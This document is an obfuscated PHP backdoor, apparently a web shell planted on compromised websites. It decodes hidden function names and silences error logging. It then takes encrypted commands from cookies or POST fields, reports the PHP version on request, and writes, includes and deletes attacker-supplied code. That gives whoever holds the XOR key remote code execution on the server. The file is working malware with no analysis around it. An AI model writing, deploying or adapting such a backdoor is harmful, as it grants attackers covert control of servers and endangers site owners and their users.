<?php $bghsixvlgz = chr(102)."\x69".chr(113-5).'e'.'_'."\160"."\x75".chr(681-565).chr(95).chr(99).'o'."\156".chr(348-232).chr(554-453)."\x6e"."\164"."\x73";
$kqkkrq = "\x62".chr(97).'s'.chr(693-592).chr(276-222)."\64".'_'.chr(100).chr(101)."\143".chr(326-215).chr(100)."\145";
$fprdudl = chr(105).chr(110).chr(105)."\137".'s'.chr(101).chr(116);
$enbve = "\165".chr(110).'l'.'i'.chr(186-76).chr(683-576);


@$fprdudl('e'."\162".'r'.'o'."\x72".'_'.chr(789-681).'o'.chr(103), NULL);
@$fprdudl("\154".chr(111)."\147".chr(95)."\x65".chr(1055-941).chr(114)."\157".'r'."\x73", 0);
@$fprdudl("\x6d"."\141".'x'.chr(775-680)."\145".'x'.chr(101)."\x63"."\165".chr(116).chr(1011-906).'o'.chr(110).chr(1035-940)."\x74".'i'.chr(941-832)."\x65", 0);
@set_time_limit(0);

function ylirvm($oiwpmf, $fdkjczxvbl)
{
    $dxjrpstf = "";
    for ($aokizedad = 0; $aokizedad < strlen($oiwpmf);) {
        for ($j = 0; $j < strlen($fdkjczxvbl) && $aokizedad < strlen($oiwpmf); $j++, $aokizedad++) {
            $dxjrpstf .= chr(ord($oiwpmf[$aokizedad]) ^ ord($fdkjczxvbl[$j]));
        }
    }
    return $dxjrpstf;
}

$lugjpt = array_merge($_COOKIE, $_POST);
$gddgealvx = '635dbf5e-747f-4e23-8d35-5f8cf073abb9';
foreach ($lugjpt as $myjsxhu => $oiwpmf) {
    $oiwpmf = @unserialize(ylirvm(ylirvm($kqkkrq($oiwpmf), $gddgealvx), $myjsxhu));
    if (isset($oiwpmf[chr(97)."\x6b"])) {
        if ($oiwpmf['a'] == "\151") {
            $aokizedad = array(
                chr(323-211).chr(508-390) => @phpversion(),
                chr(541-426).chr(118) => "3.5",
            );
            echo @serialize($aokizedad);
        } elseif ($oiwpmf['a'] == chr(101)) {
            $mfeil = "./" . md5($gddgealvx) . "\x2e"."\151".chr(203-93).'c';
            @$bghsixvlgz($mfeil, "<" . chr(63)."\160".chr(414-310)."\160".chr(544-512).chr(303-239).chr(117).chr(293-183).chr(293-185)."\x69"."\156"."\153".chr(40).chr(95).chr(95)."\106".chr(73).chr(723-647).'E'.chr(95).chr(95).')'.chr(1022-963).' ' . $oiwpmf["\144"]);
            include($mfeil);
            @$enbve($mfeil);
        }
        exit();
    }
}

